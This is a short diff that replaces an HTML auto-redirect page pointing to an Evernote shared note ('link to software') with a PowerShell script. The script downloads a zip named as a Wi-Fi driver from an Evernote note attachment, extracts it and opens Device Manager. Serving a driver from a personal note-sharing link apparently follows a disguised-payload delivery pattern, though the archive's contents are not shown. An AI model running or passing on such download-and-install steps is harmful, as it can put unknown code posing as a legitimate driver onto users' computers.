@@ -1,11 +1,7 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0; url=https://www.evernote.com/shard/s395/sh/14e605bd-51e6-48c2-3fe1-62bb546a7c68/VlbmcEcSxpd8daKgUf5F1Ks9pkqZ0nGnDgOm8dzzjUVtBJlS9y4bR_OCBg">
-    <title>Redirecting...</title>
-</head>
-<body>
-    <p>If you are not redirected automatically, follow this <a href="https://www.evernote.com/shard/s395/sh/14e605bd-51e6-48c2-3fe1-62bb546a7c68/VlbmcEcSxpd8daKgUf5F1Ks9pkqZ0nGnDgOm8dzzjUVtBJlS9y4bR_OCBg">link to software</a>.</p>
-</body>
-</html>
+Start-Process "ms-settings:powersleep"
+cd $env:USERPROFILE\Documents
+Start-Process "chrome.exe" -ArgumentList "https://apps.microsoft.com/detail/9nr5b8gvvm13?hl=en-US&gl=US"
+curl -o WiFi-22.250.1-Driver64-Win10-Win11.zip "https://content.evernote.com/shard/s395/sh/14e605bd-51e6-48c2-3fe1-62bb546a7c68/VlbmcEcSxpd8daKgUf5F1Ks9pkqZ0nGnDgOm8dzzjUVtBJlS9y4bR_OCBg/res/b593f6de-ba61-a24a-41c0-edf7c7bcc1e2"
+Expand-Archive -Path "WiFi-22.250.1-Driver64-Win10-Win11.zip" -DestinationPath "WiFi-22.250.1-Driver64-Win10-Win11"
+del WiFi-22.250.1-Driver64-Win10-Win11.zip
+devmgmt
